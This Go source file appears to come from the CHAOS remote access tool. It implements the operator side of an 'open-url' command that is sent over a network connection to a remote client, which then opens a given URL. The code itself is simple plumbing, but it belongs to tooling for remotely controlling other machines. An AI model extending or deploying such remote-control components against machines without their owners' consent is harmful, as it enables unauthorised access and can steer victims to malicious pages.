package open_url

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"net"
)

type OpenURLUseCase struct {
	Connection net.Conn
}

func NewOpenURLUseCase(conn net.Conn) usecase.OpenURL {
	return &OpenURLUseCase{
		Connection: conn,
	}
}

func (o OpenURLUseCase) Open(url []string) error {
	if len(url) <= 1 {
		fmt.Println(color.Yellow, "[!] Invalid parameters!")
		return usecase.ErrRequiredParam
	}

	fmt.Println(color.Green, "[*] Opening URL...")

	if err := network.Send(o.Connection, models.Message{
		Command: "open-url",
		Data:    []byte(url[1]),
	}); err != nil {
		log.WithField("cause", err.Error()).Error(usecase.ErrSendingRequest)
		return err
	}

	response, err := network.Read(o.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error(usecase.ErrReadingResponse)
		return err
	}
	if response.Error.HasError {
		fmt.Println(color.Green, "[!] Error opening URL!")
		return err

	}
	fmt.Println(color.Green, "[*] Command to open URL sent successfully!")
	return nil
}
